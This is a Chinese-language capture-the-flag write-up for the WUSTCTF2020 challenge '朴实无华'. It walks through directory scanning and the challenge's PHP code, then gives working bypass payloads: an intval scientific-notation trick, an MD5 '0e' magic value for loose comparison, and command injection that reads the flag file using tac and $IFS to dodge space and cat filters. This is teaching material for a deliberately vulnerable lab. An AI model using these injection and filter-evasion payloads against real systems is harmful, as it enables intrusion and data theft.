# [WUSTCTF2020]朴实无华 md5特殊值/intval绕过/过滤空格

<img src="https://i-blog.csdnimg.cn/blog_migrate/6e8f597f5bb18fde93990435510f365f.png" alt="" style="max-height:187px; box-sizing:content-box;" />


dirsearch扫吧



<img src="https://i-blog.csdnimg.cn/blog_migrate/c984bd5ad425936a6b39ac8c8c83e228.png" alt="" style="max-height:113px; box-sizing:content-box;" />


然后就可以得到 robots.txt了 记得降低点线程

-t 50 这样

我们去访问一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/9424142199bf67354e92552373deafbc.png" alt="" style="max-height:100px; box-sizing:content-box;" />


去看看 但是这个文件名一看就是fake的



<img src="https://i-blog.csdnimg.cn/blog_migrate/46f24b438f658639f981e9fcf061b169.png" alt="" style="max-height:115px; box-sizing:content-box;" />


抓抓包看看有没有传递什么吧

这里不是很顺的 其实前面耶抓包看看了 但是没有东西就不放上来了



<img src="https://i-blog.csdnimg.cn/blog_migrate/76c026c8141f85e655dd61ffde920d61.png" alt="" style="max-height:304px; box-sizing:content-box;" />


访问一下咯



<img src="https://i-blog.csdnimg.cn/blog_migrate/2553137933e79547c408a4da50581486.png" alt="" style="max-height:876px; box-sizing:content-box;" />


乱码 火狐 ALT -> 查看 -> 修复文字编码 即可

## intval 科学计数法绕过

```cobol
//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
} 
```

第一个 是关于 intval的漏洞

```cobol
intval(num,进制)
 
这里主要 可以通过进制的方式绕过 因为默认是10进制
 
这里主要是通过 科学计数法绕过
 
 
1e10 会被识别为1
 
但是 1e10+1后就会恢复原本
```

```php
<?php
$a='1e10';
echo intval($a);
echo "<br />";
echo intval($a+1);
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/239ee3985f3fb4186630299233906912.png" alt="" style="max-height:126px; box-sizing:content-box;" />


所以我们传入 ?num=1e10

## md5特殊

```cobol
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
} 
```

这里主要是特殊的MD5 加密后是和原本值一样 我们去搜一下就行了 `0e215962017` 

## 过滤空格和替换cat

cat可以使用tac

空格可以使用$IFS

我们先看看我们要读取什么文件

```cobol
?num=1e10&md5=0e215962017&get_flag=ls
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c0460a7f3dd54057d3adbd22a2fcad62.png" alt="" style="max-height:56px; box-sizing:content-box;" />


多半就是猎奇的flag了

```cobol
?num=1e10&md5=0e215962017&get_flag=tac$IFS'fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5aba331ed75af462f6ac019b01e0e58c.png" alt="" style="max-height:106px; box-sizing:content-box;" />